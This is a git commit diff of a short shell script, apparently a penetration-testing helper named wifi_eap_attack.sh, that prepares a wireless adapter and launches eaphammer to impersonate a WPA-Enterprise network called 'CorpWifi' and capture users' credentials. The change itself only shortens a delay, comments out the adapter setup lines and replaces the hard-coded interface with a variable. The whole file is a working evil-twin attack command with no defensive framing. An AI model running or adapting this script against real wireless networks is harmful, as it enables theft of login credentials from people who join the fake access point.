1cf11b2c57a74b48050a4f13f5c821cfdc925bbf
sirchsec <85844648+sirchsec@users.noreply.github.com>
2021-10-12 10:34:51 -0400

    Update wifi_eap_attack.sh

--- wifi_eap_attack.sh
+++ wifi_eap_attack.sh
@@ -2,7 +2,7 @@
 
 interface=wlan0
 echo "Interface is set to $interface"
-sleep 3
+sleep 1
 
 if [ `id -u` -eq 0 ]
 then
@@ -12,11 +12,11 @@ else
         exit 1
 fi
 
-echo "Configuring wifi adapter"
-sudo ip link set $interface down
-sudo iw $interface set txpower fixed 3000
-sudo iw dev $interface set type monitor
-sudo ip link set $interface up
+#echo "Configuring wifi adapter"
+#sudo ip link set $interface down
+#sudo iw $interface set txpower fixed 3000
+#sudo iw dev $interface set type monitor
+#sudo ip link set $interface up
 
 cd /opt/eaphammer
-/opt/eaphammer/eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
+/opt/eaphammer/eaphammer -i $interface --channel 4 --auth wpa-eap --essid CorpWifi --creds
